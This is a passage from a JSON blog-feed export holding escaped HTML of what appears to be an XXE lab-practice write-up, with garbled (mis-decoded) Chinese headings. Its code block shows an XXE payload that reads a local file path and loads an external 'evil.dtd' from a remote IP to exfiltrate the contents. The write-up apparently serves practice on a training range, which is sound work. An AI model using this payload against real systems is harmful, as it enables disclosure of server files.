class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">end</span> <span class=\"meta-string\">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%dtd; ]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">roottag</span>&gt;</span><span class=\"symbol\">&amp;all;</span><span class=\"tag\">&lt;/<span class=\"name\">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"æœ€åå“¦\"><a class=\"markdownIt-Anchor\" href=\"#æœ€åå“¦\">#</a> æœ€åå“¦</h1>\n<p>å°å¿ƒçœ¼ + è®°ä»‡ã® milkii0ï¼Œä¼šæ‰“è´¥ä½ ä»¬çš„ï¼</p>\n",
            "tags": [
                "dorabox,é¶åœºç»ƒä¹ "
            ]
        }
    ]
}